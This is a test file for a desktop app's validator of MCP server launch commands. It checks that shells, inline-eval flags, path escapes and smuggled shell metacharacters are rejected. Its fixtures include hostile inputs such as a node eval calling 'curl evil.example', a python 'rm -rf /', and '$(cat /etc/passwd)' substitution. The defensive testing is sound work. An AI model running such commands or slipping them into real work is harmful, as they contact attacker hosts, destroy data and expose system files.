import test from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync, rmSync, mkdirSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { validateCustomMcpStdioCommand } from '../apps/desktop/src/main/mcp-stdio-policy.ts'

test('allows common bare runtime commands for local MCPs', () => {
  assert.doesNotThrow(() => validateCustomMcpStdioCommand({
    name: 'filesystem',
    scope: 'machine',
    directory: null,
    command: 'npx',
  }))
})

test('rejects unknown bare commands for local MCPs', () => {
  // A non-shell, non-allowlisted command. `sh` hits the explicit
  // shell rejection with a different error message, so we use a
  // made-up runtime here to exercise the fallback allowlist path.
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'unsafe',
    scope: 'machine',
    directory: null,
    command: 'my-homegrown-runtime',
  }), /not an allowed bare command/)
})

test('allows project-relative executables that stay inside the project', () => {
  const root = mkdtempSync(join(tmpdir(), 'opencowork-mcp-'))
  const scriptPath = join(root, 'bin', 'server.js')

  try {
    mkdirSync(join(root, 'bin'), { recursive: true })
    writeFileSync(scriptPath, 'process.stdout.write("ok")', { flag: 'w' })
    assert.doesNotThrow(() => validateCustomMcpStdioCommand({
      name: 'local-project',
      scope: 'project',
      directory: root,
      command: './bin/server.js',
    }))
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('rejects project-relative executables that escape the project root', () => {
  const root = mkdtempSync(join(tmpdir(), 'opencowork-mcp-'))
  const outside = mkdtempSync(join(tmpdir(), 'opencowork-mcp-outside-'))
  const scriptPath = join(outside, 'server.js')

  try {
    writeFileSync(scriptPath, 'process.stdout.write("ok")', { flag: 'w' })
    assert.throws(() => validateCustomMcpStdioCommand({
      name: 'escaped-project',
      scope: 'project',
      directory: root,
      command: '../server.js',
    }), /must stay inside the selected project/)
  } finally {
    rmSync(root, { recursive: true, force: true })
    rmSync(outside, { recursive: true, force: true })
  }
})

test('rejects shell binaries even when passed as an absolute path', () => {
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'shell-bomb',
    scope: 'machine',
    directory: null,
    command: '/bin/bash',
  }), /shell/i)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'zsh-bomb',
    scope: 'machine',
    directory: null,
    command: 'zsh',
  }), /shell/i)
})

test('rejects script-eval flags that would turn an allowed runtime into an RCE', () => {
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'node-eval',
    scope: 'machine',
    directory: null,
    command: 'node',
    args: ['-e', 'require("child_process").exec("curl evil.example")'],
  }), /evaluates inline code/)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'python-eval',
    scope: 'machine',
    directory: null,
    command: 'python3',
    args: ['-c', 'import os; os.system("rm -rf /")'],
  }), /evaluates inline code/)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'deno-eval',
    scope: 'machine',
    directory: null,
    command: 'deno',
    args: ['--eval', 'Deno.exit()'],
  }), /evaluates inline code/)
})

test('rejects shell metacharacters smuggled into command or args', () => {
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'pipe-command',
    scope: 'machine',
    directory: null,
    command: 'node | curl evil',
  }), /shell metacharacters/)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'backtick-arg',
    scope: 'machine',
    directory: null,
    command: 'node',
    args: ['server.js', '`whoami`'],
  }), /shell metacharacters/)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'subst-arg',
    scope: 'machine',
    directory: null,
    command: 'node',
    args: ['$(cat /etc/passwd)'],
  }), /shell metacharacters/)
})

test('allows legitimate MCP invocations with flags that are not evals', () => {
  assert.doesNotThrow(() => validateCustomMcpStdioCommand({
    name: 'github-mcp',
    scope: 'machine',
    directory: null,
    command: 'npx',
    args: ['-y', '@modelcontextprotocol/server-github'],
  }))
  assert.doesNotThrow(() => validateCustomMcpStdioCommand({
    name: 'local-script',
    scope: 'machine',
    directory: null,
    command: 'node',
    args: ['./server.js', '--port=3000'],
  }))
})
